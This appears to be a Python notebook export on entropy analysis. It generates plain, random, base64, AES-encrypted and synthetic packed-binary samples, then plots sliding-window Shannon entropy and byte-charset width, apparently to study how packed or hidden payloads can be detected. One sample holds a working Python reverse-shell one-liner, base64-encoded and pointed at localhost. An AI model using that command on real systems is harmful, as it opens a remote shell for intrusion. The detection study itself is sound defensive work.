# Create some random data in multiple forms!
import random
import string
import base64
import struct
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

plaintext = ""
for i in range(1024*64):
        plaintext += random.choice(string.ascii_letters)

with open('plaintext.txt','w') as f:
    f.write(plaintext)

with open('raw.txt','wb') as f:
    f.write(os.urandom(1024*64))

with open('base64.txt','wb') as f: # just a generic python revshell, not real 
    b64 = b"""export RHOST="127.0.0.1";export RPORT=8080;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""
    b64 = base64.encodebytes(b64)
    f.write(b64)

with open('aes.txt','wb') as f:
    key = b'CryptographicKey'
    cipher = AES.new(key, AES.MODE_EAX)
    ct_bytes = cipher.encrypt(pad(bytes(plaintext,'utf-8'), AES.block_size))    
    f.write(ct_bytes)

def generate_synthetic_malware(
    filepath,
    total_size=64*1024,
    num_encrypted_blocks=2,
    block_size_range=(2048, 8192),
    seed=None
):
    """
    Generates a synthetic binary that mimics a packed/malware-like executable:
    - Realistic low-entropy code sections (structured opcodes)
    - High-entropy encrypted/compressed blobs
    - Zero-padded alignment gaps
    - A minimal fake PE-style header
    """
    if seed is not None:
        random.seed(seed)

    def fake_pe_header(size=512):
        """MZ + DOS stub + minimal PE signature, rest is structured noise"""
        header = bytearray(size)
        header[0:2] = b'MZ'                          # DOS magic
        struct.pack_into('<H', header, 0x3C, 0x40)   # PE offset pointer
        header[0x40:0x44] = b'PE\x00\x00'            # PE signature
        # fill rest with low-entropy structured bytes (repeated patterns)
        for i in range(0x44, size):
            header[i] = (i * 3 + 0x41) % 128
        return bytes(header)

    def fake_code_section(size):
        """
        Mimics x86 bytecode: structured, repetitive, entropy ~4.5-5.5
        Uses a weighted distribution skewed toward common opcode bytes
        """
        common_opcodes = [
            0x55, 0x89, 0x8B, 0x83, 0xE8, 0xFF, 0x74, 0x75,
            0x50, 0x51, 0x52, 0x53, 0x5D, 0xC3, 0x90, 0x00
        ]
        weights = [8, 8, 7, 6, 5, 5, 4, 4, 3, 3, 3, 3, 3, 4, 2, 6]
        return bytes(random.choices(common_opcodes, weights=weights, k=size))

    def fake_encrypted_block(size):
        """Truly uniform random bytes — AES ciphertext-like, entropy ~7.99"""
        return os.urandom(size)

    def fake_zero_padding(size):
        """Section alignment padding, entropy ~0"""
        return b'\x00' * size

    def fake_data_section(size):
        """Strings, imports, config — moderate entropy ~3.5-5.0"""
        charset = (
            list(range(0x20, 0x7E)) * 6 +   # printable ASCII (weighted up)
            list(range(0x00, 0x20)) * 2 +   # control chars
            list(range(0x80, 0xFF)) * 1     # high bytes (sparse)
        )
        return bytes(random.choices(charset, k=size))

    encrypted_offsets = []
    layout = []
    cursor = 0

    # 1. Fake PE header
    header = fake_pe_header(512)
    layout.append(('header', header))
    cursor += len(header)

    # 2. Code section
    code_size = total_size // 4
    layout.append(('code', fake_code_section(code_size)))
    cursor += code_size

    # 3. Data section
    data_size = total_size // 8
    layout.append(('data', fake_data_section(data_size)))
    cursor += data_size

    # 4. Scatter encrypted blocks with padding between them
    remaining = total_size - cursor
    for i in range(num_encrypted_blocks):
        # padding before encrypted block
        pad_size = random.randint(256, 1024)
        pad_size = min(pad_size, remaining // (num_encrypted_blocks - i + 1))
        layout.append(('padding', fake_zero_padding(pad_size)))
        cursor += pad_size
        remaining -= pad_size

        # encrypted block
        enc_size = random.randint(*block_size_range)
        enc_size = min(enc_size, remaining // (num_encrypted_blocks - i + 1))
        encrypted_offsets.append((cursor, cursor + enc_size))
        layout.append(('encrypted', fake_encrypted_block(enc_size)))
        cursor += enc_size
        remaining -= enc_size

    if remaining > 0:
        layout.append(('code', fake_code_section(remaining)))

    with open(filepath, 'wb') as f:
        for _, chunk in layout:
            f.write(chunk)

    print(f"Generated: {filepath}  ({cursor} bytes)")
    print(f"Layout sections:")
    offset = 0
    for name, chunk in layout:
        print(f"  [{offset:>8} - {offset+len(chunk):>8}]  {name:<12}  ({len(chunk)} bytes)")
        offset += len(chunk)
    print(f"Encrypted block offsets: {encrypted_offsets}")
    return encrypted_offsets

generate_synthetic_malware('synth_malware')

fake_payload = "\xd2\x34\xf7\x76\xe6\xfd\x9e\xb8\x47\xfe\xf3\x4e\x61\x86\x15\xe4\x31\x5f\x56\x45\x1f\xed\xe1\x4d\x7c\xfa\x36\x0c\x45\x1e\x55\xaf\x09\xbb\x8b\x64\xc2\xe7\xa2\xdd\x96\xcd\xd5\xdb\x73\xca\xb0\x9f\x59\xc1\xc4\x4a\x9e\xd6\xb4\x56\x37\x67\xed\x01\x92\x91\xfb\xf9\xa8\x6f\x47\xad\x5f\x6a\x5f\x09\x63\x9e\xb6\xe5\xfe\xcb\x3d\x84\xf0\xe3\x81\xcf\x93\xa5\x67\xab\x24\xd7\x5a\x0d\xcb\x09\x30\xf3\x12\x25\xe8\x2f\xbf\xd2\xf3\x95\xfc\x4c\x7d\x39\x71\x3a\x31\x74\x8e\xee\xd1\xbc\x7e\xcf\x56\x94\x53\x56\xe6\x24\x98\x6b\x8c\x8d\x93\xf0\x4a\xd2\x27\x99\x18\x46\xe3\xc0\x2a\x13\xf4\x1e\xc9\xc2\xec\x2b\x9d\x05\xec\x45\xf0\xc8\xac\x77\xa1\xa5\x8c\x00\xf5\xf7\xfa\x6e\x5c\xd8\x8d\x95\x0c\xc5\x0b\xd7\xd9\x18\x53\xcc\x7f\x85\x7e\xbb\x19\x8e\x31\x49\x0b\x27\x5d\x93\xdf\xcb\xc2\x4a\xc6\x4d\xcf\xb0\xd4\xc4\x5c\xad\x98\x3a\x7c\xb5\x94\xc1\x09\x0c\xd4\x18\x91\xcc\x45\xb3\xd2\xca\x35\xff\x8d\xf9\xd7\xfb\x78\x00\x44\xd4\x72\x63\x3e\x29\x3d\xab\x4b\xcd\xf0\x3b\x5b\xcb\x91\xca\xa3\x9b\x4c\x68\xcc\x03\x7e\xe9\x61\xaf\x78\xe7\x73\xf5\xfc\x72\x7c\xe3\xf5\x9b\xdd\x9f\x7e\xc7\xe5\x49\xde\x4b\x64\x83\x0e\x26\xf8\x66\xb7\x3b\xe1\x9a\x97\x2d\x43\x42\x46\x07\xa2\x55\x9a\x47\xa3\x19\xb9\x79\xca\x71\x50\xff\x4f\x0a\x2e\x37\x40\xdb\x08\x73\x8e\x10\x63\xba\x93\xe3\xec\x8a\x16\x1d\xfc\xb7\xbe\x50\x50\x24\x0a\x97\xc9\x3d\x13\x38\xb0\x63\x5a\x10\x57\xe9\x56\x55\x24\xba\x44\x57\xb7\x8e\x8c\x4f\x82\xdb\x36\xb1\x57\xb9\x83\xe7\xc9\xc1\x7c\xe0\xf1\xd6\x4c\x36\x76\x6b\x0a\x93\xb1\xc1\x25\xbc\x4f\x43\x89\xcf\x8a\xa5\x24\x79\x37\xc4\x06\xc1\xe7\xea\x47\xc7\xba\xcc\x6f\xb5\x0c\xcf\x39\xbc\x42\x1a\xb1\x59\x60\x4e\x8c\xdf\xb8\x8f\x9a\x41\x54\x7c\xdc\x01\xdf\x07\x53\x83\x31\x66\xf2\x70\x88\xc9\x6a\x51\xfa\x6e\x5c\xd8\x8d\x95\x0c\xc5\x0b\xd7\xd9\x18\x53\xcc\x7f\x85\x7e\xbb\x19\x8e\x31\x49\x0b\x27\x5d\x93\xdf\xcb\xc2\x4a\xc6\x4d\x6c\x88\x24\xd8\xaa\x5f\x1a\x2a\x47\xe3\x39\xe6\x3f\x08\x78\xcf\xa8\xdb\x8c\x68\x66\x68\xcf\xdf\xa3\x09\xfe\x21\xe1\xde\x0b\x39\x6a\x7a\x53\x55\x0b\x5b\x97\xcd\xb1\x8c\x5f\x8e\xee\x21\x8a\xb0\x8f\xec\x8c\xf0\xc2\xe7\x30\xac\xae\x53\x06\x46\x14\xa1\xdc\x6e\x2f\x9d\xae\x81\xf2\x33\xc6\xb4\x46\x3d\x6d\xae\xb3\x03\xee\xdd\xed\x92\xc9\xaa\x35\xca\xf9\xe8\x1f\x14\x4f\x70\x78\x22\x62\x81\x17\x13\xd8\xd7\x55\xde\xb0\x68\xc6\x1c\x97\xe7\xbd\x2f\xbb\x93\x07\xf7\xda\xa3\xd9\x80\x3b\xd8\x39\x15\xf2\x0c\xe7\xe5\xa1\x02\x22\x1e\x5b\xdd\x92\xe6\xf6\x2e\x1a\xcb\xf2\x3f\x5f\x49\x1f\x5e\xf1\xd6\x4c\x36\x76\x6b\x0a\x93\xb1\xc1\x25\xbc\x4f\x43\x89\xcf\x8a\xa5\x24\x79\x37\xc4\x06\xc1\xe7\xea\x47\xc7\xba\xcc\x6f\xb5\x63\xd1\x3f\x71\x64\xba\xa7\xf9\x19\xe7\x0f\x68\x18\x5f\xb0\x3e\x6b\xcd\xe9\xfd\x8f\x3f\x8c\xcc\xb4\x6f\xb7\x20\x97\x0d\x1a\x3c\xe1\x13\x31\x76\x5f\x9c\x38\x3a\xa5\x50\x68\x29\xd3\xd9\xf0\x8f\x8f\x46\xb0\x2d\x48\x8c\xde\x48\xab\x1a\x09\x9e\x3b\xe2\x5a\xc6\x18\x40\xf0\xdf\xa0\xda\x86\x75\x97\x26\x3c\x87\x66\xff\xa5\xf6\x39\xb1\xb4\xc1\x1d\x0c\x68\x6a\x52\x52\xc0\x62\x48\x61\xd4\xb9\xf5\x06\xcf\x1b\x3d\xa9\xba\x21\x20\x29\x66\xac\x71\x49\x09\xe5\x57\x38\x74\x6e\x4d\x8e\x0f\x79\xa1\x4d\xea\x87\xdf\xe9\xd4\x68\x3e\x16\x2d\xcb\x74\x20\x6e\x9e\x74\x79\x54\x73\x58\x65\x9d\xb6\xb6\x90\xce\x76\x40\x79\xdc\xc0\x7c\xef\x66\xf2\xad\xe9\x32\xb1\x98\xd4\xfb\x45\xad\x38\xd7\xfd\x41\xa5\x8e\x86\x80\xd3\x80\x42\x5d\x80\xfc\x23\x86\x5b\x77\x8d\x29\xb0\xb8\xfc\x4a\x58\x51\xf1\xb8\x7e\x70\xc7\x35\x14\x9c\xc4\x61\x50\x2e\x76\x55\x4c\x97\x71\xa9\x08\x77\x9f\x2c\xf0\x3d\xa3\xe4\x26\x2f\xdb\xf3\x91\x93\x2c\x15\xab\xc5\x1b\x5d\x21\x1e\xec\x8c\x56\xa9\x15\x7e\xfa\xb1\xca\x92\x24\x5d\x6e\x8a\xe6\x25\x26\x73\x17\x6c\x07\x10\x87\x9c\x7b\x47\x69\x30\x8e\x07\x3b\xf9\x56\x3a\x8c\xdc\xd2\xe0\xaf\x33\x1b\xeb\x89\x56\x7d\x06\xfd\xf3\xbc\xe4\xdb\x1d\x69\x77\xbc\xd3\x6a\x5a\x6a\x55\x43\xe8\x12\x7d\x3f\x50\x4f\x17\xbf\x91\x16\x67\xea\x37\x08\x74\x79\x5d\x5b\xf5\x20\xab\xb7\x3f\x6a\x83\x9b\x55\x0a\xda\xe0\x3e\xe0\x91\x11\x2f\x64\xcd\x2e\xf0\x12\xe1\xbb\x9b\x9f\x42\x0e\x45\xf1\xb6\xd5\xcb\x6f\xf9\x06\x15\x97\xae\xda\x0b\x9c\x28\x8b\xaa\xef\x9d\xd6\xe2\x88\x8d\x1e\x37\xc6\x86\xc7\x7e\xf8\xe8\xec\xd1\x91\xa0\x51\xe2\x88\xce\x37\x74\x6f\x42\x0d\x1a\x70\xcd\x32\xd8\x2e\x2a\x40\xa4\x9c\x4f\xfd\xad\x60\x7a\xe9\x7c\x91\x1f\xff\xe0\xde\x17\x63\x02\xed\xcc\xff\xe3\x67\x97\x18\xf5\x59\x52\x7f\x06\x0c\xa1\xa9\xc3\x13\xa9\x17\xfe\x43\x77\xf7\xa1\xcc\x2d\x88\x52\x00\xe5\x33\x51\x79\x71\x8f\xc3\x34\x10\x18\x34\xc6\x64\x0d\x56\x0e\x71\x92\x03\xe5\xb5\x3c\x2a\xa9\x29\xdb\x79\x87\x66\x5a\xfd\x1c\x39\x20\x1d\x48\xb0\xa4\xa4\x60\x36\x9f\x2c\x21\x3d\xe0\x1e\xf1\x7c\xd4\xb1\x2f\xc6\x96\x7c\x4d\x43\x38\xb7\xc4\x85\x21\x98\xcc\xb7\xf6\x7d\xf5\x81\x03\x29\x78\xe1\x48\x87\xa9\x08\xe2\xdf\xbf\x14\x0e\x41\x12\x7e\x6b\xf9\x2b\xe7\xd9\xf9\x9a"

import math

def entropy(data):
    """
    Implements the actual shannon entropy calculation
    H(X) = -∑[P(xi) * log(P(xi))]
    """
    if not data:
        return 0.0

    counts = {}
    for c in data:
        counts[c] = counts.get(c,0) + 1

    total = len(data)

    return -sum(
        (freq / total) * math.log2(freq / total)
        for freq in counts.values()
    )

def sliding_entropy(filepath, window=1024, step=64):
    with open(filepath, "rb") as f:
        data = f.read()

    return [
        entropy(data[i:i + window])
        for i in range(0, len(data) - window + 1, step)
    ]

def block_entropy(filepath, block_size=1024):
    with open(filepath, "rb") as f:
        data = f.read()
    
    scores = []
    l = len(data)
    for i in range(0, l, block_size):
        if (l - i) > (block_size // 2):
            scores.append(entropy(data[i:i + block_size]))
        else:
            scores.append(entropy(data[i-(block_size - (l - i)):i+block_size]))

    return scores

def file_entropy(filepath):
    with open(filepath,"rb") as f:
        data = f.read()
    
    return entropy(data)

def charset_width(filepath, block_size=1024):
    with open(filepath, 'rb') as f:
        data = f.read()
    results = []
    for i in range(0, len(data), block_size):
        block = data[i:i + block_size]
        results.append(
            len(set(block))
        )
    return results

def sliding_charset_width(filepath, window=1024, step=64):
    with open(filepath, 'rb') as f:
        data = f.read()
    return [
        len(set(data[i:i + window]))
        for i in range(0, len(data) - window + 1, step)
    ]

print("Plain:",sliding_entropy('plaintext.txt',1024))
print("Completely random:",block_entropy('raw.txt',1024))
print("Encoded:",sliding_entropy('base64.txt'))
print("Encrypted:",sliding_entropy('aes.txt',1024))
print("This file:",sliding_entropy('entropyProject.ipynb',1024))

import matplotlib.pyplot as plt

def plot_entropy(filepath, window=1024, step=None):
    if window is not None:
        if step is not None:
            scores  = sliding_entropy(filepath, window, step)
            charset = sliding_charset_width(filepath, window, step)
            offsets = [i * step for i in range(len(scores))]   # stride is step
        else:
            scores  = block_entropy(filepath, window)
            charset = charset_width(filepath, window)
            offsets = [i * window for i in range(len(scores))] # stride is window
    else:
        print(file_entropy(filepath))
        return

    padding  = 0.1
    data_min = min(scores)
    data_max = max(scores)
    spread   = data_max - data_min or 0.5

    _, ax1 = plt.subplots(figsize=(14, 4))
    ax2 = ax1.twinx()

    ax1.fill_between(offsets, scores, alpha=0.3, color='steelblue')
    ax1.plot(offsets, scores, linewidth=0.8, color='steelblue', label='Entropy')
    ax1.axhline(7, color='red', linestyle='--', linewidth=0.8, label='Entropy threshold')
    ax1.set_ylabel("Shannon entropy (bits)", color='steelblue')
    ax1.set_ylim(0, 8)

    ax2.plot(offsets, charset, linewidth=0.8, color='darkorange',
             alpha=0.7, label='Charset width')
    #ax2.axhline(65, color='green', linestyle=':', linewidth=0.8, label='Base64 width (65)')
    #ax2.axhline(16, color='green', linestyle=':', linewidth=0.8, label='ASCII Hex (16)')
    ax2.set_ylabel("Distinct bytes used", color='darkorange')
    ax2.set_ylim(0, 256)                                        # full byte range

    lines1, labels1 = ax1.get_legend_handles_labels()
    lines2, labels2 = ax2.get_legend_handles_labels()
    ax1.legend(lines1 + lines2, labels1 + labels2, loc='upper left', fontsize=8)

    ax1.set_xlabel("File offset (bytes)")
    ax1.set_title(f"Entropy + charset width — {filepath}")
    plt.tight_layout()
    plt.show()

#plot_entropy('aes.txt',256,64)
plot_entropy('entropyProject.py',1024,64)

#plot_entropy('/bin/cat',256,64)
#plot_entropy('5f2118495bbb74f0946f1476465d717ec5b6f35bf629fd3423f785479fe61202.sh',256,step=64)
#plot_entropy('base64_real',256)
